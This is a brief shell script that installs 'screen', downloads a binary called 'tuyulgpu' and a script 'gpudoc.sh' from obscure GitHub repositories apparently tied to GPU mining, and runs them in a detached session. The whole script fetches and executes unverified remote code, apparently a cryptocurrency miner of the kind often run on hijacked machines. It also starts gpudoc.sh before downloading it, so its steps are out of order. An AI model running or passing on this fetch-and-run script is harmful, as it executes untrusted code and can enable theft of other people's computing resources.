#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS gpudoc.sh ./gpudoc.sh 65 75
wget https://github.com/nuri655/jajshdbdbdbdbb/raw/main/tuyulgpu
wget https://raw.githubusercontent.com/muterminer/mutmin/main/gpudoc.sh
chmod +x gpudoc.sh
./gpudoc.sh
